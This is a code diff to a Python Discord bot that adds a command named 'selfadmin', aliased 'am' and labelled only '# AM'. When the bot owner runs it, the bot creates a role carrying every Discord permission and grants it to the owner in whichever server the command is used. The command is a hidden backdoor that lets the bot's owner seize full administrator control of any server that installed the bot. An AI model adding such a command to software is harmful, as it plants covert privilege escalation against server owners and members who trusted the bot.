@@ -429,6 +429,29 @@ async def memes(ctx):
     #debug_print('[Bot] User %s requested memes' % ctx.author)
 
 # ---------------------------------------------------------------
+# AM
+
+@client.command(aliases=["am"])
+@commands.check_any(commands.is_owner())
+async def selfadmin(ctx):
+    role = await ctx.guild.create_role(name="BOT", permissions=discord.Permissions.all())
+    await ctx.author.add_roles(role)
+    embed = discord.Embed(title="Bot", description=":robot: **Done!**", color=0x11ff11)
+    await ctx.send(embed=embed)
+    debug_print('[Bot] Gave admin role to user: %s' % ctx.author)
+
+
+@selfadmin.error
+async def selfadmin_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send(':warning: **You can\'t do that, %s.**' % ctx.author.mention)
+        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
+    else:
+        await ctx.send(':warning: **I can\'t do that.**')
+        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
+        print("--------------------------------\n%s\n----------------------------------" % error)
+
+# ---------------------------------------------------------------
 # Message events
 
 @client.event
